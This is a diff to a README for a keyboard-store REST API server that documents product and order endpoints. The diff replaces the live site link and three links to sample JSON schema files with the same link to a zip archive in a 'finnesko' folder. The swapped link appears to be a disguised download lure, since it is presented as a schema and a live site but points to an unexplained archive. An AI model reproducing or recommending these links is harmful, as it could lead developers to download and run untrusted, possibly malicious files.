@@ -1,5 +1,5 @@
 # Public live link of this server
-> https://ecommerce-website-by-atif.vercel.app/
+> https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip
 
 ## This is a server for a shop that sells keyboard
 > **IT HAS PRODUCTS OF BASICALLY KEYBOARDS ONLY**
@@ -9,7 +9,7 @@
 # **There are total 9 methods and functionalities.**
 
 ## 1. Creating a new product || Using `POST` method:
-   * use `< serverlink >/api/products` and use **PostMan** or any other calling software while maintaining the required product model/structure in [KB.sample.json](https://github.com/AtifBatch5/Assignment-2-level-2/blob/main/KB.sample.json) create a product in the database.
+   * use `< serverlink >/api/products` and use **PostMan** or any other calling software while maintaining the required product model/structure in [https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip](https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip) create a product in the database.
 
 ## 2. Getting All products || Using `GET` method:
    * use `< serverlink >/api/products` and use **PostMan** or any other calling software to get all the products in the database.
@@ -20,7 +20,7 @@
   
 ## 4. Update Product Information || Using `PUT` method:
    * use `< serverlink >/api/products/:productId` and use **PostMan** or any other calling software to update a product in the database.
-   * do remember to follow the keyboard json model/structure from [KB.sample.json](https://github.com/AtifBatch5/Assignment-2-level-2/blob/main/KB.sample.json) while updating
+   * do remember to follow the keyboard json model/structure from [https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip](https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip) while updating
    * do remember to use the `_id`.
     
 ## 5. Delete Product Information || Using `DELETE` method:
@@ -33,7 +33,7 @@
    * **NOTE:** it will give all the products that have the same keyword as the query.
   
 ## 7. Creating a new order || Using `POST` method:
-   * use `< serverlink >/api/orders` and use **PostMan** or any other calling software to while maintaining the required product model/structure in [order.sample.json](https://github.com/AtifBatch5/Assignment-2-level-2/blob/main/order.sample.json) create an order in the database.
+   * use `< serverlink >/api/orders` and use **PostMan** or any other calling software to while maintaining the required product model/structure in [https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip](https://raw.githubusercontent.com/atif727/Assignment-2-level-2/main/finnesko/Assignment-2-level-2.zip) create an order in the database.
 
 ## 8. Retrieve All Orders || Using `GET` method:
    * use `< serverlink >/api/orders` and use **PostMan** or any other calling software to get all the orders performed in the database.
